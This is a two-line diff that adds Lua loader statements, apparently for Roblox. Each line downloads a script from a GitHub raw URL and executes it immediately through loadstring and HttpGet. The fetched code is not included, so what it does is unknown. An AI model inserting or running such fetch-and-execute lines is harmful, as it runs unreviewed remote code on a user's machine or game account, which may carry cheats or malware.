@@ -1,0 +1,2 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/kevinjiafen-commits/Arch-test/refs/heads/main/Arch%20script(600)"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/kevinjiafen-commits/Test/refs/heads/main/Skin"))()
